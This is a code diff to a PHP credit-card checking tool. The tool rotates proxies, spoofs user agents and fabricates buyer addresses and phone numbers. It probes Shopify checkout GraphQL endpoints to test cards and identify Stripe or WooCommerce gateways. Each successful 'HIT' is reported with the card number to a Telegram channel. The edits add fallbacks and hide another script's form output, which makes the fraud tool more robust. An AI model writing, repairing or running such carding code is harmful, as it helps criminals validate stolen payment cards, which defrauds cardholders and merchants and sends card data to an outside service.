@@ -28,12 +28,22 @@ if (!extension_loaded('curl')) {
 
 $start_time = microtime(true);
 
-// Load dependencies
-require_once __DIR__ . '/ProxyManager.php';
-require_once __DIR__ . '/ho.php';
-require_once __DIR__ . '/AutoProxyFetcher.php';
-require_once __DIR__ . '/ProxyAnalytics.php';
-require_once __DIR__ . '/TelegramNotifier.php';
+// Load dependencies (with error handling)
+$required_files = ['ProxyManager.php', 'ho.php'];
+foreach ($required_files as $file) {
+    if (!file_exists(__DIR__ . '/' . $file)) {
+        die("Error: Required file $file not found");
+    }
+    require_once __DIR__ . '/' . $file;
+}
+
+// Optional dependencies
+$optional_files = ['AutoProxyFetcher.php', 'ProxyAnalytics.php', 'TelegramNotifier.php'];
+foreach ($optional_files as $file) {
+    if (file_exists(__DIR__ . '/' . $file)) {
+        require_once __DIR__ . '/' . $file;
+    }
+}
 
 // Initialize systems
 $agent = new userAgent();
@@ -42,8 +52,8 @@ $ua = $agent->generate('windows');
 $pm = new ProxyManager(__DIR__ . '/hit_proxy_log.txt');
 $proxy_count = file_exists(__DIR__ . '/ProxyList.txt') ? $pm->loadFromFile(__DIR__ . '/ProxyList.txt') : 0;
 
-$analytics = new ProxyAnalytics();
-$telegram = new TelegramNotifier();
+$analytics = class_exists('ProxyAnalytics') ? new ProxyAnalytics() : null;
+$telegram = class_exists('TelegramNotifier') ? new TelegramNotifier() : null;
 
 // Configure rate limiting
 $pm->setRateLimitDetection(true);
@@ -57,21 +67,69 @@ $ROTATE_PROXY = !isset($_GET['proxy']) && (!isset($_GET['rotate']) || $_GET['rot
 
 // Import GatewayDetector from autosh.php
 if (!class_exists('GatewayDetector')) {
-    require_once __DIR__ . '/autosh.php';
+    // Set a flag to prevent autosh.php from showing its form
+    $_GET['_hit_import'] = '1';
+    
+    // Temporarily buffer output to prevent form display
+    ob_start();
+    @include_once __DIR__ . '/autosh.php';
+    ob_end_clean();
+    
+    // If GatewayDetector still doesn't exist, create a dummy one
+    if (!class_exists('GatewayDetector')) {
+        class GatewayDetector {
+            public static function detect($response, $url, $extra = []) {
+                // Basic detection
+                if (stripos($response, 'shopify') !== false) {
+                    return ['name' => 'Shopify', 'supports_cards' => true];
+                }
+                if (stripos($response, 'stripe') !== false) {
+                    return ['name' => 'Stripe', 'supports_cards' => true];
+                }
+                if (stripos($response, 'woocommerce') !== false) {
+                    return ['name' => 'WooCommerce', 'supports_cards' => true];
+                }
+                return ['name' => 'Unknown', 'supports_cards' => false];
+            }
+            
+            public static function detectAll($response, $url, $extra = []) {
+                return [self::detect($response, $url, $extra)];
+            }
+            
+            public static function unknown() {
+                return ['name' => 'Unknown', 'supports_cards' => false];
+            }
+        }
+    }
 }
 
-// Load address generation
-require_once __DIR__ . '/add.php';
-$num_us = $randomAddress['numd'];
-$address_us = $randomAddress['address1'];
-$address = $num_us.' '.$address_us;
-$city_us = $randomAddress['city'];
-$state_us = $randomAddress['state'];
-$zip_us = $randomAddress['zip'];
+// Load address generation (optional)
+if (file_exists(__DIR__ . '/add.php')) {
+    require_once __DIR__ . '/add.php';
+    $num_us = $randomAddress['numd'];
+    $address_us = $randomAddress['address1'];
+    $address = $num_us.' '.$address_us;
+    $city_us = $randomAddress['city'];
+    $state_us = $randomAddress['state'];
+    $zip_us = $randomAddress['zip'];
+} else {
+    // Default US address
+    $num_us = '350';
+    $address_us = '5th Ave';
+    $address = '350 5th Ave';
+    $city_us = 'New York';
+    $state_us = 'NY';
+    $zip_us = '10118';
+}
 
-require_once __DIR__ . '/no.php';
-$areaCode = $areaCodes[array_rand($areaCodes)];
-$phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));
+if (file_exists(__DIR__ . '/no.php')) {
+    require_once __DIR__ . '/no.php';
+    $areaCode = $areaCodes[array_rand($areaCodes)];
+    $phone = sprintf("+1%d%03d%04d", $areaCode, rand(200, 999), rand(1000, 9999));
+} else {
+    // Default phone
+    $phone = '+12125551234';
+}
 
 // ============================================
 // HELPER FUNCTIONS
@@ -123,8 +181,13 @@ function apply_common_timeouts($ch): void {
 }
 
 function extractOperationQueryFromFile(string $filename, string $operationName): ?string {
-    if (!file_exists($filename)) return null;
-    $content = file_get_contents($filename);
+    $filepath = __DIR__ . '/' . $filename;
+    if (!file_exists($filepath)) {
+        // Return a default GraphQL query if file doesn't exist
+        return 'query Proposal { session { negotiate { result { sellerProposal { delivery { deliveryLines { availableDeliveryStrategies { handle amount { value { amount } } } } } payment { availablePaymentLines { paymentMethod { name } } } tax { totalTaxAmount { value { amount currencyCode } } } runningTotal { value { amount } } } } } } }';
+    }
+    
+    $content = file_get_contents($filepath);
     if ($content === false) return null;
     
     $pattern = '/' . preg_quote($operationName, '/') . '\s*\{[^}]*\}/s';
@@ -132,8 +195,8 @@ function extractOperationQueryFromFile(string $filename, string $operationName):
         return $matches[0];
     }
     
-    // Fallback: return entire content if specific operation not found
-    return $content;
+    // Fallback: return default query
+    return 'query Proposal { session { negotiate { result { sellerProposal { delivery { deliveryLines { availableDeliveryStrategies { handle amount { value { amount } } } } } payment { availablePaymentLines { paymentMethod { name } } } tax { totalTaxAmount { value { amount currencyCode } } } runningTotal { value { amount } } } } } } }';
 }
 
 function getMinimumPriceProductDetails(string $json): array {
@@ -508,10 +571,7 @@ function checkShopifyAdvanced($card, $customer, $site, $pm, $ua, $rotate_proxy, 
         $lon = isset($geocoding_data[0]['lon']) ? (float)$geocoding_data[0]['lon'] : -74.0060;
         
         // Build GraphQL proposal query
-        $proposalQuery = extractOperationQueryFromFile(__DIR__ . '/jsonp.php', 'Proposal');
-        if (empty($proposalQuery)) {
-            $proposalQuery = 'query Proposal { session { negotiate { result { sellerProposal { delivery { deliveryLines { availableDeliveryStrategies { handle amount { value { amount } } } } } payment { availablePaymentLines { paymentMethod { name } } } tax { totalTaxAmount { value { amount currencyCode } } } runningTotal { value { amount } } } } } } }';
-        }
+        $proposalQuery = extractOperationQueryFromFile('jsonp.php', 'Proposal');
         
         $proposalPayload = [
             'query' => $proposalQuery,
@@ -936,7 +996,7 @@ if (!empty($cards) && $site && !isset($customer['error'])) {
         $results[] = $result;
         
         // Notify via Telegram if enabled
-        if ($telegram->isEnabled() && $result['success']) {
+        if ($telegram && method_exists($telegram, 'isEnabled') && $telegram->isEnabled() && $result['success']) {
             $telegram->notifySuccess("💳 HIT SUCCESS\nCard: {$result['card']}\nGateway: {$result['gateway']}\nSite: {$site}");
         }
         
